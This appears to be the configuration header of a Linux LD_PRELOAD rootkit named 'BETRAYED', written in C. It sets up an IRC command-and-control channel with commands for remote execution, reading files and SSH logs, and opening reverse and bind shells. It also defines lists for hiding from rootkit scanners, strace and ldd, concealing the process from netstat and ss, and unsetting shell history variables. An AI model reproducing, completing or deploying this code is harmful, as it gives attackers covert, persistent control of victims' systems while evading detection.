/* do not touch the placeholders. */

#define HOST    "_HOST_"
#define CHANNEL "_CHANNEL_"
#define PORT    "6667" /* irc servport */

/* uncomment & change this. */
//#define CHPASS "CHANGEME"

/* uncomment & change this. */
//#define MASTER_NICK "CHANGEME"

/* when this is defined, there is a
 * 1 sec delay between each msg sent
 * to the channel. */
#define MESSAGE_INTERVAL

/* servers configured a certain way will
 * kick us if we try doing something before
 * replying to a ping. this stops that. */
#define WAIT_ON_PING

/* when this is defined, the specified channel
 * will be joined even if we don't have root
 * privs. process won't be hidden, yada yada yada. */
#undef DM_ROOT

#define NICK        "_NICK_"
#define MAGIC_GID   _MAGIC_GID_
#define INSTALL_DIR "_INSTALL_DIR_"
#define SSH_LOGS    "_SSH_LOGS_"
#define SONAME      "_SONAME_"
#define SOPATH      "_SOPATH_"

#define PRELOAD "/etc/ld.so.preload"

#define CMD_EXEC 0x0
#define CMD_SSHL 0x1
#define CMD_READ 0x2   /* these gotta be in the same order. */
#define CMD_REVR 0x3
#define CMD_BIND 0x4
#define CMD_KILL 0x5
#define CMD_DISC 0x6
#define CMD_INFO 0x7
#define CMD_HELP 0x8
#define CMD_ADDR 0x9
static char *const ircmds[11] = {"!EXEC", "!SSHL", "!READ", "!REVR",
                                 "!BIND", "!KILL", "!DISC", "!INFO",
                                 "!HELP", "!ADDR", NULL};

/* maximum length a given !EXEC command can be. */
#define EXEC_MAXLEN 256

#define BD_SHELL "/bin/sh"
#define REVR_MSG "BETRAYED REVR SHELL\n"
#define BIND_MSG "BETRAYED BIND SHELL\n"

#ifdef MESSAGE_INTERVAL
#define SEND_TOUT 1
#else
#define SEND_TOUT 0
#endif
#define BPROC_WAIT 3

static char *const bad_bins[3] = {"netstat", "ss\0", NULL};

static char *const hprocs[9] = {"lsrootkit", "ldd", "unhide", "rkhunter",
                                "chkproc", "chkdirs", "ltrace", "strace", NULL};

/* unset these variables if rootkit process. */
static char *const usetenvs[5] = {"HISTFILE", "SAVEHIST", "TMOUT", "PROMPT_COMMAND", NULL};

/* this is what we fork from again when we've had to
 * kill rootkit processes in order to stay hidden. */
static char *const default_fork[3] = {"/usr/bin/cat", "cat", "/dev/null"};